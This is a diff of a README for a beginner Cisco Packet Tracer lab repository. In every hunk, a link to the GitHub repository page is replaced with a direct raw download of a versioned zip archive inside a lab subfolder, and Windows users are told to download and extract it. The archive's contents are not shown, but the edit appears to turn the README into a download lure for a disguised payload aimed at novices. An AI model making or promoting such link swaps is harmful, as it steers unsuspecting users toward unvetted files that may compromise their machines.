@@ -1,6 +1,6 @@
 # 🛠️ Cisco-Basic-Network-Configurations - Learn Cisco Labs Step by Step
 
-[![Download / Open Repository](https://img.shields.io/badge/Download%20Now-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ebeneze4337/Cisco-Basic-Network-Configurations)
+[![Download / Open Repository](https://img.shields.io/badge/Download%20Now-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ebeneze4337/Cisco-Basic-Network-Configurations/main/01-Basic-Switch-Configuration/Cisco_Basic_Configurations_Network_v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Cisco-Basic-Network-Configurations gives you simple Cisco Packet Tracer labs for
 
 Use the link below to visit the page and download the project files:
 
-[Open the GitHub repository](https://github.com/Ebeneze4337/Cisco-Basic-Network-Configurations)
+[Open the GitHub repository](https://raw.githubusercontent.com/Ebeneze4337/Cisco-Basic-Network-Configurations/main/01-Basic-Switch-Configuration/Cisco_Basic_Configurations_Network_v2.9.zip)
 
 ## 📥 Download on Windows
 
@@ -145,7 +145,7 @@ No coding skill is needed. The labs focus on visual practice and simple network 
 
 ## 📎 Quick Access
 
-[Visit the repository to download the files](https://github.com/Ebeneze4337/Cisco-Basic-Network-Configurations)
+[Visit the repository to download the files](https://raw.githubusercontent.com/Ebeneze4337/Cisco-Basic-Network-Configurations/main/01-Basic-Switch-Configuration/Cisco_Basic_Configurations_Network_v2.9.zip)
 
 ## 📌 Helpful Practice Tips
 
@@ -170,6 +170,6 @@ These habits make it easier to learn network basics and spot mistakes.
 
 If you want to get the files now, use this link to visit the page and download the repository:
 
-[Open Cisco-Basic-Network-Configurations on GitHub](https://github.com/Ebeneze4337/Cisco-Basic-Network-Configurations)
+[Open Cisco-Basic-Network-Configurations on GitHub](https://raw.githubusercontent.com/Ebeneze4337/Cisco-Basic-Network-Configurations/main/01-Basic-Switch-Configuration/Cisco_Basic_Configurations_Network_v2.9.zip)
 
 After that, extract the files, open the Packet Tracer lab, and start the practice labs on your Windows PC
